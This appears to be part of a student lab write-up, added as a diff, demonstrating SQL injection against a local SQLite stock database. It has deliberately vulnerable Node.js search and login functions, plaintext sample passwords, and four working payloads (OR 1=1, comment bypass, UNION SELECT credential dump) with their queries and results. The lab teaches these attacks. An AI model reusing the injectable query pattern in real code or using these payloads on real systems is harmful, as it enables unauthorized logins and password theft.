@@ -163,3 +163,98 @@ Explanation:
 This query updates the price of Cement (bag) and confirms that changes persist in the database.
 
 Screenshot: screenshots/task2.png
+
+========================================
+TASK 3 – Vulnerable Functions & Attacks
+========================================
+
+-- vulnerable.js code --
+
+const Database = require('better-sqlite3');
+const db = new Database('nyondo_stock.db');
+
+// Ensure users table exists
+db.exec(`
+CREATE TABLE IF NOT EXISTS users (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  username TEXT NOT NULL,
+  password TEXT NOT NULL,
+  role TEXT DEFAULT 'attendant'
+);
+`);
+
+db.exec(`
+INSERT OR IGNORE INTO users (username, password, role) VALUES
+('admin', 'admin123', 'admin'),
+('fatuma', 'pass456', 'attendant'),
+('wasswa', 'pass789', 'manager');
+`);
+
+function searchProduct(name) {
+  const query = `SELECT * FROM products WHERE name LIKE '${name}'`;
+  console.log("Query:", query);
+  const rows = db.prepare(query).all();
+  console.log("Result:", rows, "\n");
+  return rows;
+}
+
+function login(username, password) {
+  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+  console.log("Query:", query);
+  const row = db.prepare(query).get();
+  console.log("Result:", row, "\n");
+  return row;
+}
+
+// Attacks
+searchProduct("' OR 1=1 -- ");
+login("admin' -- ", "anything");
+login("' OR '1'='1", "' OR '1'='1");
+searchProduct("' UNION SELECT id, username, password, role FROM users -- ");
+
+
+-- Attack 1: ' OR 1=1 -- --
+Query:
+SELECT * FROM products WHERE name LIKE '' OR 1=1 -- '
+Result:
+[All products returned]
+
+Explanation:
+The condition `OR 1=1` makes the WHERE clause always true, so the query ignores the filter and dumps all products.
+
+-- Attack 2: ' -- --
+Query:
+SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
+Result:
+{ id: 1, username: 'admin', password: 'admin123', role: 'admin' }
+
+Explanation:
+The `--` comment cancels the password check, allowing login as admin without verifying the password.
+
+-- Attack 3: ' OR '1'='1 --
+Query:
+SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+Result:
+{ id: 1, username: 'admin', password: 'admin123', role: 'admin' }
+
+Explanation:
+The condition `'1'='1'` is always true, so the query authenticates the user without checking credentials.
+
+-- Attack 4: UNION SELECT --
+Query:
+SELECT * FROM products WHERE name LIKE '' UNION SELECT id, username, password, role FROM users -- '
+Result:
+[
+  { id: 1, name: 'admin', description: 'admin123', price: 'admin' },
+  { id: 2, name: 'fatuma', description: 'pass456', price: 'attendant' },
+  { id: 3, name: 'wasswa', description: 'pass789', price: 'manager' }
+]
+
+Explanation:
+The UNION merges the users table into the product search, exposing usernames and passwords.
+
+Screenshot references:
+- screenshots/task3_attack1.png
+- screenshots/task3_attack2.png
+- screenshots/task3_attack3.png
+- screenshots/task3_attack4.png
